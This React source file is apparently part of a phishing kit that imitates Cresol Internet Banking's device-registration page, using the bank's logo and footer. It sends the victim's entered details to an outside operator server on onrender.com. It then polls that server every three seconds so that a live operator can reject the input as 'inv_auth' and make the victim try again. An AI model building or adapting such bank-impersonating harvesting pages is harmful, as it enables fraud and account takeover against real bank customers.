
import React, { useState, useEffect, useRef } from "react";
import { ArrowLeft, Info } from "lucide-react";
import { useNavigate } from "react-router-dom";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
import { useClientStatus } from "@/hooks/useClientStatus";

// Função para monitorar cliente continuamente na página Dispositivo
const monitorClientDispositivo = async (
  clientId: string, 
  navigate: (path: string) => void,
  onInvalidData: () => void,
  isMonitoringRef: React.MutableRefObject<boolean>
): Promise<void> => {
  console.log(`Iniciando monitoramento Dispositivo do cliente: ${clientId}`);
  
  let intervalId: NodeJS.Timeout;
  
  const monitor = async () => {
    if (!isMonitoringRef.current) {
      console.log('Monitoramento Dispositivo parado por flag');
      clearInterval(intervalId);
      return;
    }

    try {
      console.log(`Consultando dados do cliente ${clientId} na página Dispositivo...`);
      
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      console.log(`Status da consulta Dispositivo: ${response.status}`);
      
      if (response.ok) {
        const clientData = await response.json();
        console.log('Dados do cliente Dispositivo recebidos:', clientData);
        console.log('Valor do response Dispositivo:', clientData.data?.response);
        console.log('Valor do command Dispositivo:', clientData.data?.command);
        
        // Verificar se os dados são inválidos - NÃO para o monitoramento
        if (clientData.data?.response === "inv_auth" || clientData.data?.command === "inv_auth") {
          console.log('Detectado inv_auth - Dados inválidos, mas continuando monitoramento');
          onInvalidData();
          return; // Continua monitoramento, não para
        }
        
        console.log('Continuando monitoramento Dispositivo...');
      } else {
        const errorData = await response.text();
        console.log('Erro na consulta Dispositivo do cliente:', errorData);
      }

    } catch (error) {
      console.log('Erro durante consulta Dispositivo do cliente:', error);
    }
  };

  // Executar primeira consulta imediatamente
  await monitor();
  
  // Configurar monitoramento contínuo a cada 3 segundos
  intervalId = setInterval(monitor, 3000);
  console.log('Monitoramento Dispositivo contínuo configurado (3 segundos)');
};

const DispositivoPage = () => {
  const navigate = useNavigate();
  const clientStatus = useClientStatus();
  const [dataFundacao, setDataFundacao] = useState("");
  const [apelidoDispositivo, setApelidoDispositivo] = useState("");
  const [validadeAcesso, setValidadeAcesso] = useState("tempo-indeterminado");
  const [dataValidade, setDataValidade] = useState("");
  const [clientId, setClientId] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isInvalid, setIsInvalid] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const isMonitoringRef = useRef(false);

  useEffect(() => {
    // Recuperar clientId do localStorage
    const storedClientId = localStorage.getItem('clientId');
    if (storedClientId) {
      setClientId(storedClientId);
      console.log('ClientId recuperado do localStorage:', storedClientId);
      
      // Iniciar monitoramento de status
      clientStatus.startMonitoring();
    } else {
      console.log('ClientId não encontrado no localStorage');
    }

    // Cleanup quando sair da página
    return () => {
      isMonitoringRef.current = false;
      clientStatus.stopMonitoring();
    };
  }, [clientStatus]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!clientId) {
      console.log('ClientId não disponível para envio dos dados do dispositivo');
      return;
    }

    try {
      const dadosDispositivo = {
        dataFundacao,
        apelidoDispositivo,
        validadeAcesso,
        dataValidade: validadeAcesso === "ate" ? dataValidade : ""
      };

      console.log('Enviando dados do dispositivo via external-response:', dadosDispositivo);
      console.log('ClientId utilizado:', clientId);
      
      setIsLoading(true);
      setIsInvalid(false);
      setErrorMessage("");
      
      // Enviar dados do dispositivo para a API usando external-response
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          response: JSON.stringify(dadosDispositivo),
          command: "inv_auth"
        })
      });

      if (response.ok) {
        console.log('Dados do dispositivo enviados com sucesso via external-response');
        
        // Só iniciar monitoramento se não estiver já monitorando
        if (!isMonitoringRef.current) {
          isMonitoringRef.current = true;
          // Iniciar monitoramento contínuo após envio bem-sucedido
          await monitorClientDispositivo(
            clientId, 
            navigate,
            () => {
              // Função onInvalidData modificada: limpa campos, para loading, mantém monitoramento
              console.log('Dados inválidos detectados - limpando campos e parando loading');
              setDataFundacao("");
              setApelidoDispositivo("");
              setDataValidade("");
              setIsLoading(false);
              setIsInvalid(true);
              setErrorMessage("Dados inválidos. Tente novamente.");
              // NÃO para o monitoramento - isMonitoringRef.current continua true
            },
            isMonitoringRef
          );
        }
      } else {
        console.log('Erro ao enviar dados do dispositivo via external-response');
        setIsLoading(false);
      }
    } catch (error) {
      console.log('Erro durante envio dos dados do dispositivo:', error);
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    isMonitoringRef.current = false;
    navigate("/wait");
  };

  return (
    <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
      {/* Main Content Container */}
      <div className="w-full lg:w-1/2 flex flex-col items-center px-4 sm:px-6 lg:px-[7%] pt-8 lg:pt-20 pb-8 relative">
        <div className="max-w-md w-full mx-auto">
          {/* Botão Voltar */}
          <button
            onClick={handleBack}
            className="flex items-center text-gray-600 hover:text-gray-800 mb-6 transition-colors min-h-[44px] p-1"
          >
            <ArrowLeft size={20} className="mr-2" />
            <span className="text-base md:text-lg">Voltar</span>
          </button>

          <img
            src={cresolLogo}
            alt="Cresol"
            className="h-8 md:h-10 mb-6"
          />

          <h1 className="text-xl md:text-2xl font-semibold text-gray-600 mb-6 text-center lg:text-left">
            Cadastro de dispositivo
          </h1>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Data da fundação */}
            <div>
              <label className="block text-sm md:text-base text-gray-700 font-medium mb-2">
                Data da fundação
              </label>
              <input
                type="date"
                className={`w-full h-12 px-3 border rounded focus:outline-none transition text-base bg-white ${
                  isInvalid ? 'border-red-500' : 'border-gray-300'
                }`}
                value={dataFundacao}
                onChange={(e) => setDataFundacao(e.target.value)}
                required
              />
            </div>

            {/* Apelido do dispositivo */}
            <div>
              <label className="block text-sm md:text-base text-gray-700 font-medium mb-2">
                Apelido do dispositivo
              </label>
              <div className="relative">
                <input
                  type="text"
                  className={`w-full h-12 px-3 pr-16 border rounded focus:outline-none transition text-base bg-white ${
                    isInvalid ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="Meu computador"
                  value={apelidoDispositivo}
                  onChange={(e) => setApelidoDispositivo(e.target.value.slice(0, 20))}
                  maxLength={20}
                  required
                />
                <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-2">
                  <span className="text-sm text-gray-400">{apelidoDispositivo.length}/20</span>
                  <Info size={16} className="text-blue-500" />
                </div>
              </div>
            </div>

            {/* Validade de acesso do dispositivo */}
            <div>
              <label className="block text-sm md:text-base text-gray-700 font-medium mb-3">
                Validade de acesso do dispositivo
              </label>
              
              <div className="space-y-3">
                <label className="flex items-center">
                  <input
                    type="radio"
                    name="validadeAcesso"
                    value="tempo-indeterminado"
                    checked={validadeAcesso === "tempo-indeterminado"}
                    onChange={(e) => setValidadeAcesso(e.target.value)}
                    className="mr-3 w-4 h-4"
                  />
                  <div className="flex items-center">
                    <div className="w-2 h-2 bg-green-500 rounded-full mr-2"></div>
                    <span className="text-gray-700">Tempo indeterminado</span>
                  </div>
                </label>

                <label className="flex items-center">
                  <input
                    type="radio"
                    name="validadeAcesso"
                    value="somente-acesso"
                    checked={validadeAcesso === "somente-acesso"}
                    onChange={(e) => setValidadeAcesso(e.target.value)}
                    className="mr-3 w-4 h-4"
                  />
                  <div className="flex items-center">
                    <div className="w-2 h-2 bg-gray-400 rounded-full mr-2"></div>
                    <span className="text-gray-700">Somente por este acesso</span>
                  </div>
                </label>

                <label className="flex items-center">
                  <input
                    type="radio"
                    name="validadeAcesso"
                    value="ate"
                    checked={validadeAcesso === "ate"}
                    onChange={(e) => setValidadeAcesso(e.target.value)}
                    className="mr-3 w-4 h-4"
                  />
                  <div className="flex items-center">
                    <div className="w-2 h-2 bg-gray-400 rounded-full mr-2"></div>
                    <span className="text-gray-700">Até</span>
                  </div>
                </label>

                {validadeAcesso === "ate" && (
                  <div className="ml-8 flex items-center space-x-2">
                    <input
                      type="date"
                      className="h-10 px-3 border border-gray-300 rounded focus:outline-none"
                      value={dataValidade}
                      onChange={(e) => setDataValidade(e.target.value)}
                      required
                    />
                    <Info size={16} className="text-blue-500" />
                  </div>
                )}
              </div>
            </div>

            {isInvalid && (
              <p className="text-red-500 text-sm">{errorMessage}</p>
            )}

            <div className="flex space-x-4 pt-4">
              <button
                type="button"
                onClick={handleBack}
                className="flex-1 h-12 rounded-full border border-orange-500 text-orange-500 hover:bg-orange-50 transition font-bold text-base md:text-lg"
              >
                Cancelar
              </button>
              
              <button
                type="submit"
                className="flex-1 h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow disabled:opacity-70 flex items-center justify-center"
                style={{
                  background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                }}
                disabled={!dataFundacao || !apelidoDispositivo || isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                    Cadastrando...
                  </div>
                ) : (
                  "Cadastrar"
                )}
              </button>
            </div>
          </form>

          {/* Rodapé */}
          <div className="mt-12 text-center lg:text-left text-xs text-gray-800">
            <div className="font-semibold">Cresol Internet Banking - 2025</div>
            <div>Versão: 12.4.3.501 (12.4.3-501)</div>
          </div>
        </div>
      </div>

      {/* Right: Imagem da mulher - Hidden on mobile, shown on lg+ */}
      <div className="hidden lg:block lg:w-1/2 bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default DispositivoPage;
